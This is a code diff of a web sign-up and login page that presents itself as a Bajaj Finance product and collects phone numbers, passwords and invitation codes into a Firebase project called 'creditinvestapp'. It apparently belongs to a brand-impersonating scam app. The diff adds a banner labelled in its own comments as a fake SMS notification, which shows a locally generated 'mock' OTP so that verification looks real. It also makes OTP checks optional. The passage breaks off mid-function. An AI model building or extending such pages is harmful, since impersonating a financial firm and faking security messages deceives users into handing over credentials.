@@ -1,446 +1,618 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bajaj Finance - Auth</title>
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0056b3;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .main-wrapper {
-            width: 100%;
-            max-width: 440px;
-            background: #0056b3;
-            display: flex;
-            flex-direction: column;
-            position: relative;
-        }
-        .header {
-            padding: 20px 10px;
-            color: white;
-            text-align: center;
-        }
-        .header h1 { font-size: 26px; font-weight: 800; margin-bottom: 4px; display: flex; justify-content: center; align-items: center; }
-        .header h1 svg { width: 180px; height: auto; max-height: 50px; fill: white; }
-        .header p { font-size: 14px; color: #e0f7ff; }
-        .auth-card {
-            background: white;
-            border-radius: 24px;
-            padding: 30px 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
-            margin-top: 15px;
-        }
-        .tabs {
-            display: flex;
-            justify-content: space-around;
-            margin-bottom: 25px;
-            position: relative;
-        }
-        .tab { font-size: 18px; font-weight: 700; color: #aaa; cursor: pointer; padding-bottom: 8px; }
-        .tab.active { color: #0056b3; }
-        .input-group { margin-bottom: 16px; }
-        .input-group label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 6px; }
-        .input-box {
-            display: flex;
-            align-items: center;
-            background: #f8f9fa;
-            border: 1px solid #dcdcdc;
-            border-radius: 12px;
-            padding: 12px 14px;
-        }
-        .input-box input { width: 100%; border: none; outline: none; background: transparent; font-size: 14px; color: #333; }
-        .prefix { font-size: 14px; font-weight: 600; color: #333; margin-right: 8px; border-right: 1px solid #ccc; padding-right: 8px; }
-        .otp-row { display: flex; gap: 10px; align-items: center; }
-        .send-otp-btn {
-            background: #0056b3; color: white; border: none;
-            padding: 0 18px; border-radius: 12px; font-weight: bold;
-            font-size: 13px; cursor: pointer; height: 48px; flex-shrink: 0;
-        }
-        .action-btn {
-            background: #0056b3; color: white; border: none;
-            width: 100%; padding: 15px; font-weight: bold;
-            border-radius: 14px; cursor: pointer; font-size: 16px;
-            margin-top: 15px; box-shadow: 0 4px 12px rgba(0,86,179,0.3);
-        }
+<!DOCTYPE html>  
+<html lang="en">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>Bajaj Finance - Auth</title>  
+    <style>  
+        * { box-sizing: border-box; margin: 0; padding: 0; }  
+        body {  
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;  
+            background: #0056b3;  
+            display: flex;  
+            justify-content: center;  
+            align-items: center;  
+            min-height: 100vh;  
+            padding: 20px;  
+        }  
+        .main-wrapper {  
+            width: 100%;  
+            max-width: 440px;  
+            background: #0056b3;  
+            display: flex;  
+            flex-direction: column;  
+            position: relative;  
+        }  
+        .header {  
+            padding: 20px 10px;  
+            color: white;  
+            text-align: center;  
+        }  
+        .header h1 { font-size: 26px; font-weight: 800; margin-bottom: 4px; display: flex; justify-content: center; align-items: center; }  
+        .header h1 svg { width: 180px; height: auto; max-height: 50px; fill: white; }  
+        .header p { font-size: 14px; color: #e0f7ff; }  
+        .auth-card {  
+            background: white;  
+            border-radius: 24px;  
+            padding: 30px 20px;  
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);  
+            margin-top: 15px;  
+        }  
+        .tabs {  
+            display: flex;  
+            justify-content: space-around;  
+            margin-bottom: 25px;  
+            position: relative;  
+        }  
+        .tab { font-size: 18px; font-weight: 700; color: #aaa; cursor: pointer; padding-bottom: 8px; }  
+        .tab.active { color: #0056b3; }  
+        .input-group { margin-bottom: 16px; }  
+        .input-group label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 6px; }  
+        .input-box {  
+            display: flex;  
+            align-items: center;  
+            background: #f8f9fa;  
+            border: 1px solid #dcdcdc;  
+            border-radius: 12px;  
+            padding: 12px 14px;  
+        }  
+        .input-box input { width: 100%; border: none; outline: none; background: transparent; font-size: 14px; color: #333; }  
+        .prefix { font-size: 14px; font-weight: 600; color: #333; margin-right: 8px; border-right: 1px solid #ccc; padding-right: 8px; }  
+        .otp-row { display: flex; gap: 10px; align-items: center; }  
+        .send-otp-btn {  
+            background: #0056b3; color: white; border: none;  
+            padding: 0 18px; border-radius: 12px; font-weight: bold;  
+            font-size: 13px; cursor: pointer; height: 48px; flex-shrink: 0;  
+        }  
+        .send-otp-btn:disabled { background: #cccccc; cursor: not-allowed; }  
+        .action-btn {  
+            background: #0056b3; color: white; border: none;  
+            width: 100%; padding: 15px; font-weight: bold;  
+            border-radius: 14px; cursor: pointer; font-size: 16px;  
+            margin-top: 15px; box-shadow: 0 4px 12px rgba(0,86,179,0.3);  
+        }  
+        .forgot-pass-link {  
+            text-align: right;  
+            margin-top: -8px;  
+            margin-bottom: 15px;  
+        }  
+        .forgot-pass-link a {  
+            font-size: 13px;  
+            color: #0056b3;  
+            text-decoration: none;  
+            font-weight: 600;  
+            cursor: pointer;  
+        }  
+        .forgot-pass-link a:hover { text-decoration: underline; }  
 
-        /* --- OTP LOADING POPUP MODAL --- */
-        #otpLoaderModal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(4px);
-            display: none; justify-content: center; align-items: center; z-index: 3000;
-        }
-        .otp-loader-box {
-            background: #ffffff; padding: 25px; border-radius: 20px; text-align: center; width: 85%; max-width: 280px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-        }
-        .spinner-circle {
-            border: 4px solid #f3f3f3; border-top: 4px solid #0056b3; border-radius: 50%;
-            width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px auto;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* --- FAKE SMS NOTIFICATION POPUP (Top Alert) --- */  
+        #sms-banner {  
+            position: fixed;  
+            top: -100px;  
+            left: 50%;  
+            transform: translateX(-50%);  
+            width: 90%;  
+            max-width: 400px;  
+            background: #ffffff;  
+            border-left: 5px solid #0056b3;  
+            box-shadow: 0 10px 25px rgba(0,0,0,0.25);  
+            padding: 15px;  
+            border-radius: 12px;  
+            z-index: 9999;  
+            transition: top 0.4s ease-in-out;  
+            display: flex;  
+            flex-direction: column;  
+            gap: 4px;  
+        }  
+        #sms-banner.show { top: 20px; }  
+        .sms-title { font-size: 12px; font-weight: 700; color: #666; display: flex; justify-content: space-between; }  
+        .sms-body { font-size: 14px; font-weight: 600; color: #111; }  
 
-        /* --- SUCCESS MODAL --- */
-        #success-modal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(5px);
-            display: none; justify-content: center; align-items: center; z-index: 2000;
-            padding: 20px;
-        }
-        .modal-content {
-            background: linear-gradient(145deg, #ffffff, #f0f4f8);
-            width: 100%; max-width: 360px;
-            padding: 30px 24px; border-radius: 24px; text-align: center;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.8);
-        }
-        .vip-icon-box {
-            width: 60px; height: 60px; background: #e6f0fa; border-radius: 50%;
-            display: flex; align-items: center; justify-content: center; margin: 0 auto 15px auto;
-            color: #0056b3; font-size: 28px; box-shadow: 0 5px 15px rgba(0,86,179,0.15);
-        }
-        .modal-content h3 { color: #111; font-size: 22px; font-weight: 800; margin-bottom: 6px; }
-        .modal-subtitle { font-size: 13px; color: #666; margin-bottom: 20px; }
-        
-        .vip-cred-container { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }
-        .vip-box {
-            background: #f8fafc; border: 1.5px solid #e2e8f0; border-radius: 14px;
-            padding: 12px 16px; display: flex; justify-content: space-between; align-items: center;
-            text-align: left;
-        }
-        .vip-label { font-size: 12px; font-weight: 600; color: #64748b; text-transform: uppercase; }
-        .vip-value { font-size: 15px; font-weight: 700; color: #0f172a; font-family: monospace; }
+        /* --- OTP Loader Popup Modal --- */  
+        #otpLoaderModal {  
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;  
+            background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(4px);  
+            display: none; justify-content: center; align-items: center; z-index: 3000;  
+        }  
+        .otp-loader-box {  
+            background: #ffffff; padding: 25px; border-radius: 20px; text-align: center; width: 85%; max-width: 280px;  
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);  
+        }  
+        .spinner-circle {  
+            border: 4px solid #f3f3f3; border-top: 4px solid #0056b3; border-radius: 50%;  
+            width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px auto;  
+        }  
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }  
 
-        .home-redirect-btn {
-            background: linear-gradient(135deg, #0056b3, #004085);
-            color: white; border: none; width: 100%; padding: 14px;
-            font-weight: 700; border-radius: 14px; cursor: pointer; font-size: 15px;
-            box-shadow: 0 6px 15px rgba(0,86,179,0.3);
-        }
+        /* --- SUCCESS MODAL --- */  
+        #success-modal {  
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;  
+            background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(5px);  
+            display: none; justify-content: center; align-items: center; z-index: 2000;  
+            padding: 20px;  
+        }  
+        .modal-content {  
+            background: linear-gradient(145deg, #ffffff, #f0f4f8);  
+            width: 100%; max-width: 360px;  
+            padding: 30px 24px; border-radius: 24px; text-align: center;  
+            box-shadow: 0 15px 35px rgba(0,0,0,0.3);  
+            border: 1px solid rgba(255,255,255,0.8);  
+        }  
+        .vip-icon-box {  
+            width: 60px; height: 60px; background: #e6f0fa; border-radius: 50%;  
+            display: flex; align-items: center; justify-content: center; margin: 0 auto 15px auto;  
+            color: #0056b3; font-size: 28px; box-shadow: 0 5px 15px rgba(0,86,179,0.15);  
+        }  
+        .modal-content h3 { color: #111; font-size: 22px; font-weight: 800; margin-bottom: 6px; }  
+        .modal-subtitle { font-size: 13px; color: #666; margin-bottom: 20px; }  
+          
+        .vip-cred-container { display: flex; flex-direction: column; gap: 10px; margin-bottom: 20px; }  
+        .vip-box {  
+            background: #f8fafc; border: 1.5px solid #e2e8f0; border-radius: 14px;  
+            padding: 12px 16px; display: flex; justify-content: space-between; align-items: center;  
+            text-align: left;  
+        }  
+        .vip-label { font-size: 12px; font-weight: 600; color: #64748b; text-transform: uppercase; }  
+        .vip-value { font-size: 15px; font-weight: 700; color: #0f172a; font-family: monospace; }  
 
-        #custom-toast {
-            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
-            background: rgba(0, 0, 0, 0.85); color: white; padding: 12px 24px;
-            border-radius: 30px; font-size: 13px; display: none; z-index: 1000;
-        }
-    </style>
+        .home-redirect-btn {  
+            background: linear-gradient(135deg, #0056b3, #004085);  
+            color: white; border: none; width: 100%; padding: 14px;  
+            font-weight: 700; border-radius: 14px; cursor: pointer; font-size: 15px;  
+            box-shadow: 0 6px 15px rgba(0,86,179,0.3);  
+        }  
 
-    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+        #custom-toast {  
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);  
+            background: rgba(0, 0, 0, 0.85); color: white; padding: 12px 24px;  
+            border-radius: 30px; font-size: 13px; display: none; z-index: 1000;  
+        }  
+    </style>  
+
+    <!-- Firebase SDKs for Firestore Database Storage -->  
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>  
     <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
-</head>
-<body>
+</head>  
+<body>  
 
-    <div class="main-wrapper">
-        <div class="header">
-            <h1>
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 567 178" id="bajaj-finserv"><path fill="#ffffff" d="M192.1 82.11V28.25h47.63c9.82 0 25.62 1.33 25.62 14.13 0 6.29-5.52 10.73-11.94 12.34 8 2.4 11.94 6.82 11.94 12.87 0 13.2-15 14.46-25.62 14.5H192.1zm17.49-22.69l5-8.26a6.9 6.9 0 0 1 5.67-3h19.47c3.48 0 6.31-1.59 6.31-4.29s-2.81-4.32-6.31-4.32H209.59zm0 0V82.09l5-8.27a6.92 6.92 0 0 1 5.67-3h19.21c3.64.06 6.52-2.52 6.52-5.67s-2.82-5.69-6.52-5.69zm98-18.17L284 82.15H263.46l32.92-53.9h22.5l32.89 53.86H331.23l-5.52-9.6H295.23l5.06-8.26a7 7 0 0 1 5.67-3h13.2zm143 0L427 82.15H406.43l32.91-53.9h22.5l32.88 53.86H474.23l-5.53-9.6H438.23l5-8.26a6.93 6.93 0 0 1 5.65-3H462.1l-11.52-20zm-67 29.57c4 0 7.19-1.93 7.19-5.85V28.25h17.41V66.59c0 11.62-7.69 15.52-17.76 15.52h-29.1a7 7 0 0 1-5.66-3l-5.06-8.3zm142.93 0c4 0 7.21-1.93 7.21-5.85V28.25h17.46V66.59c0 11.62-7.67 15.52-17.75 15.52h-29.1a6.9 6.9 0 0 1-5.66-3l-5.06-8.3zM192 100h43.12v13.09H206.94V126h25.48v12.39H206.94v15.58H192zM245.28 100h15v53.9h-15zM273.23 100h13.94l22.18 28.49V100h14.78v53.9H311l-23-29.56v29.56H273.23zM332.68 145.93L341 136a27.76 27.76 0 0 0 17.48 6.47c4 0 6.16-1.39 6.16-3.7v-.15c0-2.23-1.77-3.47-9.08-5.16-11.48-2.62-20.33-5.85-20.33-16.94v-.15c0-10 7.93-17.25 20.87-17.25 9.16 0 16.32 2.46 22.17 7.16l-7.47 10.55c-4.93-3.47-10.31-5.32-15.09-5.32-3.62 0-5.39 1.54-5.39 3.47v.15c0 2.47 1.85 3.54 9.32 5.24 12.4 2.69 20.09 6.7 20.09 16.79v.15c0 11-8.7 17.55-21.78 17.55-9.56 0-18.64-3-25.26-8.93zM390 100h43.35v12.71H404.83v8.16H430.7v11.78H404.83v8.56h28.95V154H390zM444.48 100H470c8.24 0 13.94 2.16 17.55 5.85 3.16 3.08 4.78 7.24 4.78 12.55v.16c0 8.24-4.39 13.7-11.09 16.55l12.86 18.79H476.82L466 137.62h-6.54v16.32H444.48zm24.75 25.88c5.09 0 8-2.47 8-6.4v-.15c0-4.24-3.08-6.39-8.08-6.39h-9.78v12.94zM497.07 100h16.71L526 134.15 538.23 100h16.4l-21.87 54.29H518.94zM137.23 109.35c0 19.17-21.42 21-36.57 21.09H87V113.18h27.1V100H87V82.11h30V68.19H71.14v62.28H53.61V52.19h47.07c14 0 36.57 2 36.57 20.52 0 9.16-7.85 15.9-17 18.21 11.34 3.5 17 9.12 17 18.43zM93.33 21a70.33 70.33 0 1 0 70.33 70.33h0A70.33 70.33 0 0 0 93.35 21z"></path></svg>
-            </h1>
-            <p>A product by Bajaj Finance</p>
-        </div>
+<!-- Fake SMS Notification Banner at Top -->
+<div id="sms-banner">
+    <div class="sms-title"><span>💬 Messages • Just now</span><span style="cursor: pointer;" onclick="document.getElementById('sms-banner').classList.remove('show')">✕</span></div>
+    <div class="sms-body" id="smsTextContent">Your Bajaj Finance OTP is 482910</div>
+</div>
 
-        <div class="auth-card">
-            <div class="tabs">
-                <div class="tab" id="loginTab" onclick="switchTab('login')">Log in</div>
-                <div class="tab active" id="signupTab" onclick="switchTab('signup')">Sign up</div>
-            </div>
+<div class="main-wrapper">  
+    <div class="header">  
+        <h1>  
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 567 178" id="bajaj-finserv"><path fill="#ffffff" d="M192.1 82.11V28.25h47.63c9.82 0 25.62 1.33 25.62 14.13 0 6.29-5.52 10.73-11.94 12.34 8 2.4 11.94 6.82 11.94 12.87 0 13.2-15 14.46-25.62 14.5H192.1zm17.49-22.69l5-8.26a6.9 6.9 0 0 1 5.67-3h19.47c3.48 0 6.31-1.59 6.31-4.29s-2.81-4.32-6.31-4.32H209.59zm0 0V82.09l5-8.27a6.92 6.92 0 0 1 5.67-3h19.21c3.64.06 6.52-2.52 6.52-5.67s-2.82-5.69-6.52-5.69zm98-18.17L284 82.15H263.46l32.92-53.9h22.5l32.89 53.86H331.23l-5.52-9.6H295.23l5.06-8.26a7 7 0 0 1 5.67-3h13.2zm143 0L427 82.15H406.43l32.91-53.9h22.5l32.88 53.86H474.23l-5.53-9.6H438.23l5-8.26a6.93 6.93 0 0 1 5.65-3H462.1l-11.52-20zm-67 29.57c4 0 7.19-1.93 7.19-5.85V28.25h17.41V66.59c0 11.62-7.69 15.52-17.76 15.52h-29.1a7 7 0 0 1-5.66-3l-5.06-8.3zm142.93 0c4 0 7.21-1.93 7.21-5.85V28.25h17.46V66.59c0 11.62-7.67 15.52-17.75 15.52h-29.1a6.9 6.9 0 0 1-5.66-3l-5.06-8.3zM192 100h43.12v13.09H206.94V126h25.48v12.39H206.94v15.58H192zM245.28 100h15v53.9h-15zM273.23 100h13.94l22.18 28.49V100h14.78v53.9H311l-23-29.56v29.56H273.23zM332.68 145.93L341 136a27.76 27.76 0 0 0 17.48 6.47c4 0 6.16-1.39 6.16-3.7v-.15c0-2.23-1.77-3.47-9.08-5.16-11.48-2.62-20.33-5.85-20.33-16.94v-.15c0-10 7.93-17.25 20.87-17.25 9.16 0 16.32 2.46 22.17 7.16l-7.47 10.55c-4.93-3.47-10.31-5.32-15.09-5.32-3.62 0-5.39 1.54-5.39 3.47v.15c0 2.47 1.85 3.54 9.32 5.24 12.4 2.69 20.09 6.7 20.09 16.79v.15c0 11-8.7 17.55-21.78 17.55-9.56 0-18.64-3-25.26-8.93zM390 100h43.35v12.71H404.83v8.16H430.7v11.78H404.83v8.56h28.95V154H390zM444.48 100H470c8.24 0 13.94 2.16 17.55 5.85 3.16 3.08 4.78 7.24 4.78 12.55v.16c0 8.24-4.39 13.7-11.09 16.55l12.86 18.79H476.82L466 137.62h-6.54v16.32H444.48zm24.75 25.88c5.09 0 8-2.47 8-6.4v-.15c0-4.24-3.08-6.39-8.08-6.39h-9.78v12.94zM497.07 100h16.71L526 134.15 538.23 100h16.4l-21.87 54.29H518.94zM137.23 109.35c0 19.17-21.42 21-36.57 21.09H87V113.18h27.1V100H87V82.11h30V68.19H71.14v62.28H53.61V52.19h47.07c14 0 36.57 2 36.57 20.52 0 9.16-7.85 15.9-17 18.21 11.34 3.5 17 9.12 17 18.43zM93.33 21a70.33 70.33 0 1 0 70.33 70.33h0A70.33 70.33 0 0 0 93.35 21z"></path></svg>  
+        </h1>  
+        <p>A product by Bajaj Finance</p>  
+    </div>  
 
-            <!-- Sign Up Form -->
-            <div id="signupSection">
-                <div class="input-group">
-                    <label>Phone Number</label>
-                    <div class="input-box">
-                        <span class="prefix">+91</span>
-                        <input type="text" id="regPhone" placeholder="Please enter your phone number">
-                    </div>
-                </div>
+    <div class="auth-card">  
+        <div class="tabs">  
+            <div class="tab" id="loginTab" onclick="switchTab('login')">Log in</div>  
+            <div class="tab active" id="signupTab" onclick="switchTab('signup')">Sign up</div>  
+        </div>  
 
-                <div class="input-group">
-                    <label>Login Password</label>
-                    <div class="input-box">
-                        <input type="password" id="regPass" placeholder="Set log in password">
-                    </div>
-                </div>
+        <!-- Sign Up Form -->  
+        <div id="signupSection">  
+            <div class="input-group">  
+                <label>Phone Number</label>  
+                <div class="input-box">  
+                    <span class="prefix">+91</span>  
+                    <input type="text" id="regPhone" placeholder="Please enter your phone number">  
+                </div>  
+            </div>  
 
-                <div class="input-group">
-                    <label>Nick name</label>
-                    <div class="input-box">
-                        <input type="text" id="regNick" placeholder="Enter your nick name">
-                    </div>
-                </div>
+            <div class="input-group">  
+                <label>Login Password</label>  
+                <div class="input-box">  
+                    <input type="password" id="regPass" placeholder="Set log in password">  
+                </div>  
+            </div>  
 
-                <div class="input-group">
-                    <label>Invitation code (Optional)</label>
-                    <div class="input-box">
-                        <input type="text" id="regInvite" placeholder="Invitation code">
-                    </div>
-                </div>
+            <div class="input-group">  
+                <label>Nick name</label>  
+                <div class="input-box">  
+                    <input type="text" id="regNick" placeholder="Enter your nick name">  
+                </div>  
+            </div>  
 
-                <div class="input-group">
-                    <label>Verification code (OTP)</label>
+            <div class="input-group">  
+                <label>Invitation code (Optional)</label>  
+                <div class="input-box">  
+                    <input type="text" id="regInvite" placeholder="Invitation code">  
+                </div>  
+            </div>  
+
+            <div class="input-group">  
+                <label>Verification code (OTP) <span style="font-weight: normal; color: #888;">(Optional)</span></label>  
+                <div class="otp-row">  
+                    <div class="input-box" style="flex: 1;">  
+                        <input type="text" id="regOtp" placeholder="Verification code (Optional)">  
+                    </div>  
+                    <button class="send-otp-btn" id="sendOtpBtn" onclick="sendOTP()">Send</button>  
+                </div>  
+            </div>  
+
+            <button class="action-btn" id="registerBtn">Register Now</button>  
+        </div>  
+
+        <!-- Login Form -->  
+        <div id="loginSection" style="display: none;">  
+            <div class="input-group">  
+                <label>Phone Number</label>  
+                <div class="input-box">  
+                    <span class="prefix">+91</span>  
+                    <input type="text" id="loginPhone" placeholder="Please enter your phone number">  
+                </div>  
+            </div>  
+
+            <div class="input-group" id="loginPassGroup">  
+                <label id="loginPassLabel">Login Password</label>  
+                <div class="input-box">  
+                    <input type="password" id="loginPass" placeholder="Please enter your login password">  
+                </div>  
+            </div>  
+
+            <!-- Forgot Password Toggle Link -->  
+            <div class="forgot-pass-link">  
+                <a id="forgotToggleBtn" onclick="toggleForgotPassword()">Forgot Password?</a>  
+            </div>  
+
+            <button class="action-btn" id="loginBtn">Login in now</button>  
+        </div>  
+    </div>  
+
+    <!-- OTP Loader Popup Modal -->  
+    <div id="otpLoaderModal">  
+        <div class="otp-loader-box">  
+            <div class="spinner-circle"></div>  
+            <p style="font-weight: 600; color: #333; font-size: 14px;" id="loaderText">Sending Verification Code...</p>  
+            <p style="font-size: 12px; color: #666; margin-top: 5px;">Please wait a moment</p>  
+        </div>  
+    </div>  
+
+    <!-- Success Modal Popup -->  
+    <div id="success-modal">  
+        <div class="modal-content">  
+            <div class="vip-icon-box">✓</div>  
+            <h3 id="modalTitle">Registration Successful</h3>  
+            <div class="modal-subtitle" id="modalSubText">Save your login details securely</div>  
+              
+            <div class="vip-cred-container" id="modalBody"></div>  
+
+            <button class="home-redirect-btn" id="goToHomeBtn">Continue to Home</button>  
+        </div>  
+    </div>  
+
+    <div id="custom-toast">Message here</div>  
+</div>  
+
+<script>  
+    const firebaseConfig = {  
+        apiKey: "AIzaSyAyFldowBw6ChbopLGCCQ8U7_RH4kmyFpM",  
+        authDomain: "creditinvestapp.firebaseapp.com",  
+        projectId: "creditinvestapp",  
+        storageBucket: "creditinvestapp.firebasestorage.app",  
+        messagingSenderId: "299058832737",  
+        appId: "1:299058832737:web:fe1c1df553e209715c1120"  
+    };  
+
+    if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);  
+    const db = firebase.firestore();  
+
+    let generatedOTP = ""; // Store mock generated OTP  
+    let isForgotPasswordMode = false; // Track forgot password state  
+
+    window.addEventListener('DOMContentLoaded', () => {  
+        const urlParams = new URLSearchParams(window.location.search);  
+        const inviteCodeFromURL = urlParams.get('invite');  
+        if(inviteCodeFromURL) {  
+            document.getElementById('regInvite').value = inviteCodeFromURL;  
+        }  
+    });  
+
+    window.showToast = function(msg) {  
+        let toast = document.getElementById('custom-toast');  
+        toast.innerText = msg;  
+        toast.style.display = 'block';  
+        setTimeout(() => { toast.style.display = 'none'; }, 3000);  
+    };  
+
+    window.switchTab = function(tab) {  
+        const loginTab = document.getElementById('loginTab');  
+        const signupTab = document.getElementById('signupTab');  
+        const loginSec = document.getElementById('loginSection');  
+        const signupSec = document.getElementById('signupSection');  
+
+        if(tab === 'login') {  
+            loginTab.classList.add('active');  
+            signupTab.classList.remove('active');  
+            loginSec.style.display = 'block';  
+            signupSec.style.display = 'none';  
+            resetLoginFormState(); // Reset back to normal login view  
+        } else {  
+            signupTab.classList.add('active');  
+            loginTab.classList.remove('active');  
+            signupSec.style.display = 'block';  
+            loginSec.style.display = 'none';  
+        }  
+    };  
+
+    // Toggle between Normal Login and Forgot Password Mode
+    window.toggleForgotPassword = function() {
+        isForgotPasswordMode = !isForgotPasswordMode;
+        const passLabel = document.getElementById('loginPassLabel');
+        const passInput = document.getElementById('loginPass');
+        const loginBtn = document.getElementById('loginBtn');
+        const toggleBtn = document.getElementById('forgotToggleBtn');
+        const passGroup = document.getElementById('loginPassGroup');
+
+        // Remove existing OTP row if already present
+        let existingOtpRow = document.getElementById('forgotOtpRow');
+        if(existingOtpRow) existingOtpRow.remove();
+
+        if(isForgotPasswordMode) {
+            passLabel.innerText = "New Login Password";
+            passInput.placeholder = "Enter your new password";
+            loginBtn.innerText = "Reset Password";
+            toggleBtn.innerText = "← Back to Login";
+
+            // Add OTP input field dynamically for Forgot Password
+            let otpHtml = `
+                <div class="input-group" id="forgotOtpRow">
+                    <label>Verification code (OTP) <span style="font-weight: normal; color: #888;">(Optional)</span></label>
                     <div class="otp-row">
                         <div class="input-box" style="flex: 1;">
-                            <input type="text" id="regOtp" placeholder="Verification code (OTP)">
+                            <input type="text" id="loginOtp" placeholder="Verification code">
                         </div>
-                        <button class="send-otp-btn" onclick="sendOTP()">Send</button>
+                        <button class="send-otp-btn" id="loginSendOtpBtn" onclick="sendLoginOTP()">Send</button>
                     </div>
                 </div>
+            `;
+            passGroup.insertAdjacentHTML('beforebegin', otpHtml);
+        } else {
+            resetLoginFormState();
+        }
+    };
 
-                <button class="action-btn" id="registerBtn">Register Now</button>
-            </div>
+    function resetLoginFormState() {
+        isForgotPasswordMode = false;
+        document.getElementById('loginPassLabel').innerText = "Login Password";
+        document.getElementById('loginPass').placeholder = "Please enter your login password";
+        document.getElementById('loginBtn').innerText = "Login in now";
+        document.getElementById('forgotToggleBtn').innerText = "Forgot Password?";
+        let existingOtpRow = document.getElementById('forgotOtpRow');
+        if(existingOtpRow) existingOtpRow.remove();
+    }
 
-            <!-- Login Form -->
-            <div id="loginSection" style="display: none;">
-                <div class="input-group">
-                    <label>Phone Number</label>
-                    <div class="input-box">
-                        <span class="prefix">+91</span>
-                        <input type="text" id="loginPhone" placeholder="Please enter your phone number">
-                    </div>
-                </div>
+    // Start 120 Seconds Countdown Timer
+    function startOtpTimer(btnId = 'sendOtpBtn') {
+        const sendBtn = document.getElementById(btnId);
+        let timeLeft = 120;
+        sendBtn.disabled = true;
 
-                <div class="input-group">
-                    <label>Login Password</label>
-                    <div class="input-box">
-                        <input type="password" id="loginPass" placeholder="Please enter your login password">
-                    </div>
-                </div>
-
-                <button class="action-btn" id="loginBtn">Login in now</button>
-            </div>
-        </div>
-
-        <!-- OTP Loader Popup Modal -->
-        <div id="otpLoaderModal">
-            <div class="otp-loader-box">
-                <div class="spinner-circle"></div>
-                <p style="font-weight: 600; color: #333; font-size: 14px;">Sending Verification Code...</p>
-                <p style="font-size: 12px; color: #666; margin-top: 5px;">Please wait a moment</p>
-            </div>
-        </div>
-
-        <!-- Success Modal Popup -->
-        <div id="success-modal">
-            <div class="modal-content">
-                <div class="vip-icon-box">✓</div>
-                <h3 id="modalTitle">Registration Successful</h3>
-                <div class="modal-subtitle" id="modalSubText">Save your login details securely</div>
-                
-                <div class="vip-cred-container" id="modalBody"></div>
-
-                <button class="home-redirect-btn" id="goToHomeBtn">Continue to Home</button>
-            </div>
-        </div>
-
-        <div id="custom-toast">Message here</div>
-    </div>
-
-    <script>
-        const firebaseConfig = {
-            apiKey: "AIzaSyAyFldowBw6ChbopLGCCQ8U7_RH4kmyFpM",
-            authDomain: "creditinvestapp.firebaseapp.com",
-            projectId: "creditinvestapp",
-            storageBucket: "creditinvestapp.firebasestorage.app",
-            messagingSenderId: "299058832737",
-            appId: "1:299058832737:web:fe1c1df553e209715c1120"
-        };
-
-        if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
-
-        let generatedOtp = "";
-
-        window.addEventListener('DOMContentLoaded', () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const inviteCodeFromURL = urlParams.get('invite');
-            if(inviteCodeFromURL) {
-                document.getElementById('regInvite').value = inviteCodeFromURL;
-            }
-        });
-
-        window.showToast = function(msg) {
-            let toast = document.getElementById('custom-toast');
-            toast.innerText = msg;
-            toast.style.display = 'block';
-            setTimeout(() => { toast.style.display = 'none'; }, 3000);
-        };
-
-        window.switchTab = function(tab) {
-            const loginTab = document.getElementById('loginTab');
-            const signupTab = document.getElementById('signupTab');
-            const loginSec = document.getElementById('loginSection');
-            const signupSec = document.getElementById('signupSection');
-
-            if(tab === 'login') {
-                loginTab.classList.add('active');
-                signupTab.classList.remove('active');
-                loginSec.style.display = 'block';
-                signupSec.style.display = 'none';
+        const timerInterval = setInterval(() => {
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                sendBtn.innerText = "Send";
+                sendBtn.disabled = false;
             } else {
-                signupTab.classList.add('active');
-                loginTab.classList.remove('active');
-                signupSec.style.display = 'block';
-                loginSec.style.display = 'none';
+                sendBtn.innerText = `${timeLeft}s`;
+                timeLeft--;
             }
-        };
+        }, 1000);
+    }
 
-        // Send OTP with Popup Loader and Auto-fetch feature
-        window.sendOTP = function() {
-            const phone = document.getElementById('regPhone').value.trim();
-            if(!phone || phone.length < 10) {
-                showToast("Please enter a valid 10-digit phone number!");
-                return;
-            }
+    // Show Fake SMS Notification Banner at the Top
+    function showSmsBanner(otp) {
+        const banner = document.getElementById('sms-banner');
+        const textContent = document.getElementById('smsTextContent');
+        textContent.innerText = `Your Bajaj Finance verification code is ${otp}`;
+        
+        banner.classList.add('show');
+        
